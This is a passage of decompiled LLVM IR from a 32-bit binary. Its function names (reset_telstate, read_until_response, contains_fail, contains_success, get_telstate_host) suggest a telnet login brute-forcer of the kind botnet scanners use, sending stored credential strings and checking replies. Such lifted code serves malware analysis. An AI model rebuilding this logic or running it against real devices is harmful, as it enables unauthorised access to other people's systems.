  store i32 %v2_804a174, i32* %v3_804a851, align 4
  %v0_804a852 = load i32, i32* %stack_var_-332, align 4
  %v1_804a852 = call i32 @reset_telstate(i32 %v0_804a852)
  store i32 %v1_804a852, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a85f:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a875 = add i32 %v2_804a32b, %v2_804a172
  %v4_804a875 = inttoptr i32 %v3_804a875 to i8*
  %v5_804a875 = load i8, i8* %v4_804a875, align 2
  %v6_804a875 = zext i8 %v5_804a875 to i32
  store i32 %v6_804a875, i32* %eax.global-to-local, align 4
  %v1_804a87e = mul nuw nsw i32 %v6_804a875, 4
  %v2_804a87e = add nuw nsw i32 %v1_804a87e, 134582752
  %v3_804a87e = inttoptr i32 %v2_804a87e to i32*
  %v4_804a87e = load i32, i32* %v3_804a87e, align 4
  %v1_804a890 = and i32 %v4_804a87e, -256
  store i32 %v1_804a890, i32* %eax.global-to-local, align 4
  %v4_804a893 = inttoptr i32 %v4_804a87e to i8*
  store i32 %v4_804a87e, i32* @edi, align 4
  %v3_804a899 = call i32 @_strlen(i8* %v4_804a893)
  store i32 %v3_804a899, i32* @esi, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v5_804a8b8 = load i8, i8* %v4_804a875, align 2
  %v6_804a8b8 = zext i8 %v5_804a8b8 to i32
  store i32 %v6_804a8b8, i32* %eax.global-to-local, align 4
  %v1_804a8c1 = mul nuw nsw i32 %v6_804a8b8, 4
  %v2_804a8c1 = add nuw nsw i32 %v1_804a8c1, 134582752
  %v3_804a8c1 = inttoptr i32 %v2_804a8c1 to i32*
  %v4_804a8c1 = load i32, i32* %v3_804a8c1, align 4
  store i32 %v4_804a8c1, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a8de = inttoptr i32 %v2_804a174 to i32*
  %v4_804a8de = load i32, i32* %v3_804a8de, align 4
  store i32 %v4_804a8de, i32* %eax.global-to-local, align 4
  %v0_804a8e1 = load i32, i32* @esp, align 4
  %v1_804a8e1 = add i32 %v0_804a8e1, -4
  %v2_804a8e1 = inttoptr i32 %v1_804a8e1 to i32*
  store i32 16384, i32* %v2_804a8e1, align 4
  %v0_804a8e6 = load i32, i32* @esi, align 4
  %v2_804a8e6 = add i32 %v0_804a8e1, -8
  %v3_804a8e6 = inttoptr i32 %v2_804a8e6 to i32*
  store i32 %v0_804a8e6, i32* %v3_804a8e6, align 4
  %v0_804a8e7 = load i32, i32* @ebx, align 4
  %v2_804a8e7 = add i32 %v0_804a8e1, -12
  %v3_804a8e7 = inttoptr i32 %v2_804a8e7 to i32*
  store i32 %v0_804a8e7, i32* %v3_804a8e7, align 4
  %v0_804a8e8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a8e8 = add i32 %v0_804a8e1, -16
  %v3_804a8e8 = inttoptr i32 %v2_804a8e8 to i32*
  store i32 %v0_804a8e8, i32* %v3_804a8e8, align 4
  %v4_804a8e9 = call i32 @__libc_send(i32 %v4_804a87e, i32 %v2_804a07d, i32 %v6_804a1c3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a8e9, i32* %eax.global-to-local, align 4
  %v0_804a8ee = load i32, i32* @esp, align 4
  %v2_804a8f1 = icmp slt i32 %v4_804a8e9, 0
  %v1_804a8f3 = icmp eq i1 %v2_804a8f1, false
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804a8f3, label %dec_label_pc_804a91f, label %dec_label_pc_804a8f5

dec_label_pc_804a8f5:                             ; preds = %dec_label_pc_804a85f
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804a911 = inttoptr i32 %v0_804a8ee to i32*
  store i32 %v2_804a174, i32* %v3_804a911, align 4
  %v1_804a912 = call i32 @reset_telstate(i32 %v4_804a87e)
  store i32 %v1_804a912, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a91f:                             ; preds = %dec_label_pc_804a85f
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a935 = load i32, i32* %v3_804a8de, align 4
  store i32 %v4_804a935, i32* %eax.global-to-local, align 4
  %v1_804a938 = add i32 %v0_804a8ee, 12
  %v2_804a938 = inttoptr i32 %v1_804a938 to i32*
  store i32 16384, i32* %v2_804a938, align 4
  %v1_804a93d = add i32 %v0_804a8ee, 8
  %v2_804a93d = inttoptr i32 %v1_804a93d to i32*
  store i32 2, i32* %v2_804a93d, align 4
  %v1_804a93f = add i32 %v0_804a8ee, 4
  %v2_804a93f = inttoptr i32 %v1_804a93f to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8056178.57 to i32), i32* %v2_804a93f, align 4
  %v0_804a944 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a944 = inttoptr i32 %v0_804a8ee to i32*
  store i32 %v0_804a944, i32* %v3_804a944, align 4
  %v4_804a945 = call i32 @__libc_send(i32 %v4_804a87e, i32 %v2_804a07d, i32 %v6_804a1c3, i32 ptrtoint (i32* @0 to i32))
  %v0_804a94a = load i32, i32* @esp, align 4
  %v2_804a94d = icmp slt i32 %v4_804a945, 0
  %v1_804a94f = icmp eq i1 %v2_804a94d, false
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  br i1 %v1_804a94f, label %dec_label_pc_804a97b, label %dec_label_pc_804a951

dec_label_pc_804a951:                             ; preds = %dec_label_pc_804a91f
  %v3_804a96d = inttoptr i32 %v0_804a94a to i32*
  store i32 %v2_804a174, i32* %v3_804a96d, align 4
  %v1_804a96e = call i32 @reset_telstate(i32 %v4_804a87e)
  store i32 %v1_804a96e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a97b:                             ; preds = %dec_label_pc_804a91f
  %v1_804a997 = add i32 %v0_804a94a, 4
  %v2_804a997 = inttoptr i32 %v1_804a997 to i32*
  store i32 4, i32* %v2_804a997, align 4
  %v0_804a999 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a999 = inttoptr i32 %v0_804a94a to i32*
  store i32 %v0_804a999, i32* %v3_804a999, align 4
  %v2_804a99a = inttoptr i32 %v4_804a87e to i32*
  %v3_804a99a = call i32 @advance_state(i32* %v2_804a99a, i32 %v2_804a07d)
  store i32 %v3_804a99a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804a9a7:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  %v1_804a9bf = add i32 %v2_804a174, 24
  store i32 %v1_804a9bf, i32* %eax.global-to-local, align 4
  %v1_804a9c2 = inttoptr i32 %v1_804a9bf to i32*
  %v2_804a9c2 = load i32, i32* %v1_804a9c2, align 4
  store i32 %v2_804a9c2, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a9da = inttoptr i32 %v2_804a174 to i32*
  %v4_804a9da = load i32, i32* %v3_804a9da, align 4
  store i32 %v4_804a9da, i32* %eax.global-to-local, align 4
  %v0_804a9dd = load i32, i32* @esp, align 4
  %v1_804a9e0 = add i32 %v0_804a9dd, -16
  %v2_804a9e0 = inttoptr i32 %v1_804a9e0 to i32*
  store i32 ptrtoint (i32* @global_var_8059e2c to i32), i32* %v2_804a9e0, align 4
  %v1_804a9e5 = add i32 %v0_804a9dd, -20
  %v2_804a9e5 = inttoptr i32 %v1_804a9e5 to i32*
  store i32 1024, i32* %v2_804a9e5, align 4
  %v0_804a9ea = load i32, i32* @ebx, align 4
  %v2_804a9ea = add i32 %v0_804a9dd, -24
  %v3_804a9ea = inttoptr i32 %v2_804a9ea to i32*
  store i32 %v0_804a9ea, i32* %v3_804a9ea, align 4
  %v5_804a9eb = add i32 %v0_804a9dd, -28
  %v6_804a9eb = inttoptr i32 %v5_804a9eb to i32*
  store i32 %arg1, i32* %v6_804a9eb, align 4
  %v0_804a9ee = load i32, i32* %eax.global-to-local, align 4
  %v2_804a9ee = add i32 %v0_804a9dd, -32
  %v3_804a9ee = inttoptr i32 %v2_804a9ee to i32*
  store i32 %v0_804a9ee, i32* %v3_804a9ee, align 4
  %v1_804a9ef = call i32 @read_until_response(i32 %v6_804a1c3)
  %v0_804a9f4 = load i32, i32* @esp, align 4
  %v1_804a9f7 = icmp eq i32 %v1_804a9ef, 0
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  br i1 %v1_804a9f7, label %dec_label_pc_804aa84, label %dec_label_pc_804a9ff

dec_label_pc_804a9ff:                             ; preds = %dec_label_pc_804a9a7
  store i32 %v1_804a9bf, i32* %eax.global-to-local, align 4
  %v2_804aa1a = load i32, i32* %v1_804a9c2, align 4
  store i32 %v2_804aa1a, i32* %eax.global-to-local, align 4
  %v2_804aa1f = add i32 %v0_804a9f4, 16
  %v3_804aa1f = inttoptr i32 %v2_804aa1f to i32*
  store i32 %v2_804aa1a, i32* %v3_804aa1f, align 4
  %v1_804aa20 = call i32 @contains_fail(i32 %stack_var_-620.244)
  %v0_804aa25 = load i32, i32* @esp, align 4
  %v1_804aa28 = icmp eq i32 %v1_804aa20, 0
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804aa74 = add i32 %v0_804aa25, 4
  %v2_804aa74 = inttoptr i32 %v1_804aa74 to i32*
  br i1 %v1_804aa28, label %dec_label_pc_804aa58, label %dec_label_pc_804aa2c

dec_label_pc_804aa2c:                             ; preds = %dec_label_pc_804a9ff
  store i32 0, i32* %v2_804aa74, align 4
  %v0_804aa4a = load i32, i32* %eax.global-to-local, align 4
  %v3_804aa4a = inttoptr i32 %v0_804aa25 to i32*
  store i32 %v0_804aa4a, i32* %v3_804aa4a, align 4
  %v2_804aa4b = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804aa4b = call i32 @advance_state(i32* %v2_804aa4b, i32 %v2_804a07d)
  store i32 %v3_804aa4b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804aa58:                             ; preds = %dec_label_pc_804a9ff
  store i32 5, i32* %v2_804aa74, align 4
  %v0_804aa76 = load i32, i32* %eax.global-to-local, align 4
  %v3_804aa76 = inttoptr i32 %v0_804aa25 to i32*
  store i32 %v0_804aa76, i32* %v3_804aa76, align 4
  %v2_804aa77 = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804aa77 = call i32 @advance_state(i32* %v2_804aa77, i32 %v2_804a07d)
  store i32 %v3_804aa77, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804aa84:                             ; preds = %dec_label_pc_804a9a7
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v2_804aa9f = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804aa9f, i32* %eax.global-to-local, align 4
  %v1_804aaa1 = add i32 %v2_804aa9f, 3
  store i32 %v1_804aaa1, i32* @ebx, align 4
  %v1_804aaa7 = add i32 %v0_804a9f4, 16
  %v2_804aaa7 = inttoptr i32 %v1_804aaa7 to i32*
  store i32 0, i32* %v2_804aaa7, align 4
  %v1_804aaa9 = inttoptr i32 %stack_var_-620.244 to i32*
  %v2_804aaa9 = call i32 @__GI_time(i32* %v1_804aaa9)
  store i32 %v2_804aaa9, i32* %eax.global-to-local, align 4
  %v0_804aab1 = load i32, i32* @ebx, align 4
  %v7_804aab1 = icmp ult i32 %v0_804aab1, %v2_804aaa9
  %v1_804aab3 = icmp eq i1 %v7_804aab1, false
  br i1 %v1_804aab3, label %dec_label_pc_804b021, label %dec_label_pc_804aab9

dec_label_pc_804aab9:                             ; preds = %dec_label_pc_804aa84
  %v0_804aaae = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804aad5 = inttoptr i32 %v0_804aaae to i32*
  store i32 %v2_804a174, i32* %v3_804aad5, align 4
  %v1_804aad6 = call i32 @reset_telstate(i32 %stack_var_-620.244)
  store i32 %v1_804aad6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804aae3:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804aaf9 = add i32 %v2_804a2f1, %v2_804a172
  %v4_804aaf9 = inttoptr i32 %v3_804aaf9 to i8*
  %v5_804aaf9 = load i8, i8* %v4_804aaf9, align 1
  %v6_804aaf9 = zext i8 %v5_804aaf9 to i32
  store i32 %v6_804aaf9, i32* %eax.global-to-local, align 4
  %v1_804ab02 = mul nuw nsw i32 %v6_804aaf9, 4
  %v2_804ab02 = add nuw nsw i32 %v1_804ab02, 134584512
  %v3_804ab02 = inttoptr i32 %v2_804ab02 to i32*
  %v4_804ab02 = load i32, i32* %v3_804ab02, align 4
  %v1_804ab14 = and i32 %v4_804ab02, -256
  store i32 %v1_804ab14, i32* %eax.global-to-local, align 4
  %v4_804ab17 = inttoptr i32 %v4_804ab02 to i8*
  store i32 %v4_804ab02, i32* @edi, align 4
  %v3_804ab1d = call i32 @_strlen(i8* %v4_804ab17)
  store i32 %v3_804ab1d, i32* @esi, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v5_804ab3c = load i8, i8* %v4_804aaf9, align 1
  %v6_804ab3c = zext i8 %v5_804ab3c to i32
  store i32 %v6_804ab3c, i32* %eax.global-to-local, align 4
  %v1_804ab45 = mul nuw nsw i32 %v6_804ab3c, 4
  %v2_804ab45 = add nuw nsw i32 %v1_804ab45, 134584512
  %v3_804ab45 = inttoptr i32 %v2_804ab45 to i32*
  %v4_804ab45 = load i32, i32* %v3_804ab45, align 4
  store i32 %v4_804ab45, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804ab62 = inttoptr i32 %v2_804a174 to i32*
  %v4_804ab62 = load i32, i32* %v3_804ab62, align 4
  store i32 %v4_804ab62, i32* %eax.global-to-local, align 4
  %v0_804ab65 = load i32, i32* @esp, align 4
  %v1_804ab65 = add i32 %v0_804ab65, -4
  %v2_804ab65 = inttoptr i32 %v1_804ab65 to i32*
  store i32 16384, i32* %v2_804ab65, align 4
  %v0_804ab6a = load i32, i32* @esi, align 4
  %v2_804ab6a = add i32 %v0_804ab65, -8
  %v3_804ab6a = inttoptr i32 %v2_804ab6a to i32*
  store i32 %v0_804ab6a, i32* %v3_804ab6a, align 4
  %v0_804ab6b = load i32, i32* @ebx, align 4
  %v2_804ab6b = add i32 %v0_804ab65, -12
  %v3_804ab6b = inttoptr i32 %v2_804ab6b to i32*
  store i32 %v0_804ab6b, i32* %v3_804ab6b, align 4
  %v0_804ab6c = load i32, i32* %eax.global-to-local, align 4
  %v2_804ab6c = add i32 %v0_804ab65, -16
  %v3_804ab6c = inttoptr i32 %v2_804ab6c to i32*
  store i32 %v0_804ab6c, i32* %v3_804ab6c, align 4
  %v4_804ab6d = call i32 @__libc_send(i32 %v4_804ab02, i32 %stack_var_-620.244, i32 %v2_804a07d, i32 %v6_804a1c3)
  store i32 %v4_804ab6d, i32* %eax.global-to-local, align 4
  %v0_804ab72 = load i32, i32* @esp, align 4
  %v2_804ab75 = icmp slt i32 %v4_804ab6d, 0
  %v1_804ab77 = icmp eq i1 %v2_804ab75, false
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804ab77, label %dec_label_pc_804aba3, label %dec_label_pc_804ab79

dec_label_pc_804ab79:                             ; preds = %dec_label_pc_804aae3
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804ab95 = inttoptr i32 %v0_804ab72 to i32*
  store i32 %v2_804a174, i32* %v3_804ab95, align 4
  %v1_804ab96 = call i32 @reset_telstate(i32 %v4_804ab02)
  store i32 %v1_804ab96, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804aba3:                             ; preds = %dec_label_pc_804aae3
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804abb9 = load i32, i32* %v3_804ab62, align 4
  store i32 %v4_804abb9, i32* %eax.global-to-local, align 4
  %v1_804abbc = add i32 %v0_804ab72, 12
  %v2_804abbc = inttoptr i32 %v1_804abbc to i32*
  store i32 16384, i32* %v2_804abbc, align 4
  %v1_804abc1 = add i32 %v0_804ab72, 8
  %v2_804abc1 = inttoptr i32 %v1_804abc1 to i32*
  store i32 2, i32* %v2_804abc1, align 4
  %v1_804abc3 = add i32 %v0_804ab72, 4
  %v2_804abc3 = inttoptr i32 %v1_804abc3 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8056178.57 to i32), i32* %v2_804abc3, align 4
  %v0_804abc8 = load i32, i32* %eax.global-to-local, align 4
  %v3_804abc8 = inttoptr i32 %v0_804ab72 to i32*
  store i32 %v0_804abc8, i32* %v3_804abc8, align 4
  %v4_804abc9 = call i32 @__libc_send(i32 %v4_804ab02, i32 %stack_var_-620.244, i32 %v2_804a07d, i32 %v6_804a1c3)
  %v0_804abce = load i32, i32* @esp, align 4
  %v2_804abd1 = icmp slt i32 %v4_804abc9, 0
  %v1_804abd3 = icmp eq i1 %v2_804abd1, false
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  br i1 %v1_804abd3, label %dec_label_pc_804abff, label %dec_label_pc_804abd5

dec_label_pc_804abd5:                             ; preds = %dec_label_pc_804aba3
  %v3_804abf1 = inttoptr i32 %v0_804abce to i32*
  store i32 %v2_804a174, i32* %v3_804abf1, align 4
  %v1_804abf2 = call i32 @reset_telstate(i32 %v4_804ab02)
  store i32 %v1_804abf2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804abff:                             ; preds = %dec_label_pc_804aba3
  %v1_804ac1b = add i32 %v0_804abce, 4
  %v2_804ac1b = inttoptr i32 %v1_804ac1b to i32*
  store i32 6, i32* %v2_804ac1b, align 4
  %v0_804ac1d = load i32, i32* %eax.global-to-local, align 4
  %v3_804ac1d = inttoptr i32 %v0_804abce to i32*
  store i32 %v0_804ac1d, i32* %v3_804ac1d, align 4
  %v2_804ac1e = inttoptr i32 %v4_804ab02 to i32*
  %v3_804ac1e = call i32 @advance_state(i32* %v2_804ac1e, i32 %stack_var_-620.244)
  store i32 %v3_804ac1e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804ac2b:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  %v1_804ac43 = add i32 %v2_804a174, 24
  store i32 %v1_804ac43, i32* %eax.global-to-local, align 4
  %v1_804ac46 = inttoptr i32 %v1_804ac43 to i32*
  %v2_804ac46 = load i32, i32* %v1_804ac46, align 4
  store i32 %v2_804ac46, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804ac5e = inttoptr i32 %v2_804a174 to i32*
  %v4_804ac5e = load i32, i32* %v3_804ac5e, align 4
  store i32 %v4_804ac5e, i32* %eax.global-to-local, align 4
  %v0_804ac61 = load i32, i32* @esp, align 4
  %v1_804ac64 = add i32 %v0_804ac61, -16
  %v2_804ac64 = inttoptr i32 %v1_804ac64 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_8059e80.58 to i32), i32* %v2_804ac64, align 4
  %v1_804ac69 = add i32 %v0_804ac61, -20
  %v2_804ac69 = inttoptr i32 %v1_804ac69 to i32*
  store i32 1024, i32* %v2_804ac69, align 4
  %v0_804ac6e = load i32, i32* @ebx, align 4
  %v2_804ac6e = add i32 %v0_804ac61, -24
  %v3_804ac6e = inttoptr i32 %v2_804ac6e to i32*
  store i32 %v0_804ac6e, i32* %v3_804ac6e, align 4
  %v5_804ac6f = add i32 %v0_804ac61, -28
  %v6_804ac6f = inttoptr i32 %v5_804ac6f to i32*
  store i32 %arg1, i32* %v6_804ac6f, align 4
  %v0_804ac72 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ac72 = add i32 %v0_804ac61, -32
  %v3_804ac72 = inttoptr i32 %v2_804ac72 to i32*
  store i32 %v0_804ac72, i32* %v3_804ac72, align 4
  %v1_804ac73 = call i32 @read_until_response(i32 %v6_804a1c3)
  store i32 %v1_804ac73, i32* %eax.global-to-local, align 4
  %v0_804ac78 = load i32, i32* @esp, align 4
  %v1_804ac7b = icmp eq i32 %v1_804ac73, 0
  br i1 %v1_804ac7b, label %dec_label_pc_804ae66, label %dec_label_pc_804ac83

dec_label_pc_804ac83:                             ; preds = %dec_label_pc_804ac2b
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804ac89 = add i32 %v0_804ac78, 16
  %v2_804ac89 = inttoptr i32 %v1_804ac89 to i32*
  store i32 0, i32* %v2_804ac89, align 4
  %v1_804ac8b = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804ac8b = call i32 @__GI_time(i32* %v1_804ac8b)
  store i32 %v2_804ac8b, i32* @esi, align 4
  %v0_804ac98 = load i32, i32* @ebx, align 4
  %v2_804aca8 = mul i32 %v0_804ac98, 28
  %v1_804acac = add i32 %v2_804acaa, %v2_804aca8
  %v2_804acaf = inttoptr i32 %v1_804acac to i32*
  store i32 %v2_804ac8b, i32* %v2_804acaf, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v1_804ac43, i32* %eax.global-to-local, align 4
  %v2_804accc = load i32, i32* %v1_804ac46, align 4
  store i32 %v2_804accc, i32* %eax.global-to-local, align 4
  %v0_804acce = load i32, i32* @esp, align 4
  %v2_804acd1 = add i32 %v0_804acce, -16
  %v3_804acd1 = inttoptr i32 %v2_804acd1 to i32*
  store i32 %v2_804accc, i32* %v3_804acd1, align 4
  %v1_804acd2 = call i32 @contains_fail(i32 %stack_var_-624.243)
  store i32 %v1_804acd2, i32* %eax.global-to-local, align 4
  %v0_804acd7 = load i32, i32* @esp, align 4
  %v1_804acda = icmp eq i32 %v1_804acd2, 0
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804acda, label %dec_label_pc_804ad0a, label %dec_label_pc_804acde

dec_label_pc_804acde:                             ; preds = %dec_label_pc_804ac83
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804acfa = add i32 %v0_804acd7, 4
  %v2_804acfa = inttoptr i32 %v1_804acfa to i32*
  store i32 0, i32* %v2_804acfa, align 4
  %v0_804acfc = load i32, i32* %eax.global-to-local, align 4
  %v3_804acfc = inttoptr i32 %v0_804acd7 to i32*
  store i32 %v0_804acfc, i32* %v3_804acfc, align 4
  %v3_804acfd = call i32 @advance_state(i32* %v1_804ac8b, i32 %stack_var_-620.244)
  store i32 %v3_804acfd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804ad0a:                             ; preds = %dec_label_pc_804ac83
  store i32 %v1_804ac43, i32* %eax.global-to-local, align 4
  %v2_804ad25 = load i32, i32* %v1_804ac46, align 4
  store i32 %v2_804ad25, i32* %eax.global-to-local, align 4
  %v3_804ad2a = inttoptr i32 %v0_804acd7 to i32*
  store i32 %v2_804ad25, i32* %v3_804ad2a, align 4
  %v1_804ad2b = call i32 @contains_success(i32 %stack_var_-624.243)
  store i32 %v1_804ad2b, i32* %eax.global-to-local, align 4
  %v0_804ad30 = load i32, i32* @esp, align 4
  %v1_804ad33 = icmp eq i32 %v1_804ad2b, 0
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804ad33, label %dec_label_pc_804ae3c, label %dec_label_pc_804ad3b

dec_label_pc_804ad3b:                             ; preds = %dec_label_pc_804ad0a
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804ad51 = add i32 %v2_804a206, %v2_804a172
  %v4_804ad51 = inttoptr i32 %v3_804ad51 to i8*
  %v5_804ad51 = load i8, i8* %v4_804ad51, align 1
  %v6_804ad51 = zext i8 %v5_804ad51 to i32
  %v9_804ad51 = or i32 %v6_804ad51, %v8_804a1c3
  store i32 %v9_804ad51, i32* %eax.global-to-local, align 4
  %v10_804ad55 = icmp eq i8 %v5_804ad51, 2
  %v1_804ad57 = icmp eq i1 %v10_804ad55, false
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804ad57, label %dec_label_pc_804ad85, label %dec_label_pc_804ad59

dec_label_pc_804ad59:                             ; preds = %dec_label_pc_804ad3b
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804ad75 = add i32 %v0_804ad30, 4
  %v2_804ad75 = inttoptr i32 %v1_804ad75 to i32*
  store i32 7, i32* %v2_804ad75, align 4
  %v0_804ad77 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ad77 = inttoptr i32 %v0_804ad30 to i32*
  store i32 %v0_804ad77, i32* %v3_804ad77, align 4
  %v3_804ad78 = call i32 @advance_state(i32* %v1_804ac8b, i32 %stack_var_-620.244)
  store i32 %v3_804ad78, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804ad85:                             ; preds = %dec_label_pc_804ad3b
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804ad9b = add i32 %v2_804a2f1, %v2_804a172
  %v4_804ad9b = inttoptr i32 %v3_804ad9b to i8*
  %v5_804ad9b = load i8, i8* %v4_804ad9b, align 1
  %v6_804ad9b = zext i8 %v5_804ad9b to i32
  store i32 %v6_804ad9b, i32* %eax.global-to-local, align 4
  %v1_804ada4 = mul nuw nsw i32 %v6_804ad9b, 4
  %v2_804ada4 = add nuw nsw i32 %v1_804ada4, 134584512
  %v3_804ada4 = inttoptr i32 %v2_804ada4 to i32*
  %v4_804ada4 = load i32, i32* %v3_804ada4, align 4
  store i32 %v4_804ada4, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804adc1 = add i32 %v2_804a32b, %v2_804a172
  %v4_804adc1 = inttoptr i32 %v3_804adc1 to i8*
  %v5_804adc1 = load i8, i8* %v4_804adc1, align 2
  %v6_804adc1 = zext i8 %v5_804adc1 to i32
  store i32 %v6_804adc1, i32* %eax.global-to-local, align 4
  %v1_804adca = mul nuw nsw i32 %v6_804adc1, 4
  %v2_804adca = add nuw nsw i32 %v1_804adca, 134582752
  %v3_804adca = inttoptr i32 %v2_804adca to i32*
  %v4_804adca = load i32, i32* %v3_804adca, align 4
  store i32 %v4_804adca, i32* @esi, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804aded = inttoptr i32 %v0_804ad30 to i32*
  store i32 %v2_804a174, i32* %v3_804aded, align 4
  %v0_804adee = call i32 @get_telstate_host()
  store i32 %v0_804adee, i32* %eax.global-to-local, align 4
  %v0_804adf3 = load i32, i32* @esp, align 4
  %v0_804adf6 = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804adf6, i32* %edx.global-to-local, align 4
  %v0_804adff = load i32, i32* @ebx, align 4
  %v3_804adff = inttoptr i32 %v0_804adf3 to i32*
  store i32 %v0_804adff, i32* %v3_804adff, align 4
  %v0_804ae00 = load i32, i32* @esi, align 4
  %v2_804ae00 = add i32 %v0_804adf3, -4
  %v3_804ae00 = inttoptr i32 %v2_804ae00 to i32*
  store i32 %v0_804ae00, i32* %v3_804ae00, align 4
  %v2_804ae01 = add i32 %v0_804adf3, -8
  %v3_804ae01 = inttoptr i32 %v2_804ae01 to i32*
  store i32 %v0_804adee, i32* %v3_804ae01, align 4
  %v1_804ae02 = add i32 %v0_804adf3, -12
  %v2_804ae02 = inttoptr i32 %v1_804ae02 to i32*
  store i32 ptrtoint (i32* @global_var_805617c.59 to i32), i32* %v2_804ae02, align 4
  %v0_804ae07 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ae07 = add i32 %v0_804adf3, -16
  %v3_804ae07 = inttoptr i32 %v2_804ae07 to i32*
  store i32 %v0_804ae07, i32* %v3_804ae07, align 4
  %v2_804ae08 = call i32 @Rootsprintf(i32 %stack_var_-624.243, i32 %stack_var_-620.244)
  %v0_804ae0d = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804ae2c = add i32 %v0_804ae0d, 20
  %v2_804ae2c = inttoptr i32 %v1_804ae2c to i32*
  store i32 7, i32* %v2_804ae2c, align 4
  %v0_804ae2e = load i32, i32* %eax.global-to-local, align 4
  %v2_804ae2e = add i32 %v0_804ae0d, 16
  %v3_804ae2e = inttoptr i32 %v2_804ae2e to i32*
  store i32 %v0_804ae2e, i32* %v3_804ae2e, align 4
  %v3_804ae2f = call i32 @advance_state(i32* %v1_804ac8b, i32 %stack_var_-620.244)
  store i32 %v3_804ae2f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b021

dec_label_pc_804ae3c:                             ; preds = %dec_label_pc_804ad0a
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804ae58 = inttoptr i32 %v0_804ad30 to i32*
  store i32 %v2_804a174, i32* %v3_804ae58, align 4
